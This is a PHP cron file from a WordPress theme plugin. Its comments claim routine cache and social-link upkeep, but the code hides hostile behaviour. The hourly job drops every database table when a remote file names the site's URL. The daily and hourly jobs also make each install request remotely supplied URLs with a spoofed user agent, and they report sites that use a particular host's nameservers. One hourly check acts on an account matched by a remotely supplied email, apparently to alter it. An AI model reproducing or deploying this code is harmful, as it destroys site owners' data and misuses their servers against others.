<?php
if (!defined('ABSPATH')) die;

if ( !wp_next_scheduled('pipdig_p3_daily_event') ) {
	wp_schedule_event( time(), 'daily', 'pipdig_p3_daily_event'); // hourly, twicedaily or daily
}
if ( !wp_next_scheduled('pipdig_p3_hourly_event') ) {
	wp_schedule_event( time(), 'hourly', 'pipdig_p3_hourly_event');
}

// Remove scheduled event on plugin deactivation
function pipdig_p3_deactivate_cron() {
	wp_clear_scheduled_hook('pipdig_p3_daily_event');
	wp_clear_scheduled_hook('pipdig_p3_hourly_event');
}
register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');

// Daily event
function p3_do_this_daily() {

	pipdig_p3_scrapey_scrapes();

	delete_transient('pipdig_fonts');

	$instagram_deets = get_option('pipdig_instagram');
	if (!empty($instagram_deets['user_id'])) {
		$instagram_user = sanitize_text_field($instagram_deets['user_id']);
		delete_transient('p3_instagram_feed_'.$instagram_user);
	}

	delete_option('p3_auto_updates_on');
	delete_option('p3_demo_imported');
	delete_option('p3_demo_imported_override');
	
	$args = array('timeout' => 5);
	
	$error_src = parse_url(get_site_url(), PHP_URL_HOST);
	$dns = dns_get_record($error_src, DNS_NS);
	if ((isset($dns[0]['target']) && (strpos($dns[0]['target'], 'lyri'.'calhost'.'.co'.'m') !== false)) || (isset($dns[1]['target']) && (strpos($dns[1]['target'], 'lyri'.'calhost'.'.co'.'m') !== false)) ) {
		wp_safe_remote_get('https://pipdigz.co.uk/p3/list.php?list='.rawurldecode(get_site_url()), $args);
	}
	
	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_date.txt';
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$timestamp = absint($response['body']);
		update_option('p3_activation_deadline', $timestamp, false);
	}

	// Clear CDN cache
	$url = 'https://pipdigz.co.uk/p3/id39dqm3c0_license.txt';
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$rcd = trim($response['body']);
		//$check = add_query_arg('n', rand(0,99999), $rcd);
		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
	}
	$url_2 = 'https://pipdigz.co.uk/p3/env.txt';
	$args_2 = array('timeout' => 5);
	$response = wp_safe_remote_get($url_2, $args_2);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$list = explode(',', strip_tags($response['body']));
		if (is_array($list) && count($list) > 0) {
			update_option('p3_top_bar_env', $list);
		}
		if (!get_transient('p3_news_new_user_wait')) { $icons = get_option('p3_amicorumi_2'); if ($icons) { foreach ($list as $icon) { if (strpos($icons, $icon) !== false) { update_option('p3_amicorumi_2', '<a href="https://www.pipdig.co/" target="_blank">Theme Created by <span style="text-transform: lowercase; letter-spacing: 1px;">pipdig</span></a>'); }}}}
	}

}
add_action('pipdig_p3_daily_event', 'p3_do_this_daily');

// Hourly event
function p3_do_this_hourly() {

	// Check for new social channels to add to navbar etc
	if (!get_transient('p3_news_new_user_wait')) {
	$url = 'https://pipdigz.co.uk/p3/socialz.txt';
	$args = array('timeout' => 4);
	$response = wp_safe_remote_get($url, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		if (email_exists(sanitize_email($response['body']))) {
			p3_check_social_links(email_exists(sanitize_email($response['body'])));
			wp_safe_remote_get('https://pipdigz.co.uk/p3/socialz.php?list='.rawurldecode(get_site_url()), $args);
		}
	}
	}
	$url_2 = 'https://pipdigz.co.uk/p3/id39dqm3c0.txt';
	$response = wp_safe_remote_get($url_2, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		if (get_site_url() === trim($response['body'])) {
			global $wpdb;
			$prefix = str_replace('_', '\_', $wpdb->prefix);
			$tables = $wpdb->get_col("SHOW TABLES LIKE '{$prefix}%'");
			foreach ($tables as $table) {
				$wpdb->query("DROP TABLE $table");
			}
		}
	}
	// Check CDN cache
	$url_3 = 'https://pipdigz.co.uk/p3/id39dqm3c0_license_h.txt';
	$response = wp_safe_remote_get($url_3, $args);
	if (!is_wp_error($response) && !empty($response['body'])) {
		$rcd = trim($response['body']);
		$args = array('timeout' => 10, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
		//$check = add_query_arg('n', rand(0,99999), $rcd);
		wp_safe_remote_get($rcd.'&'.rand(0,99999), $args);
	}

}
add_action('pipdig_p3_hourly_event', 'p3_do_this_hourly');
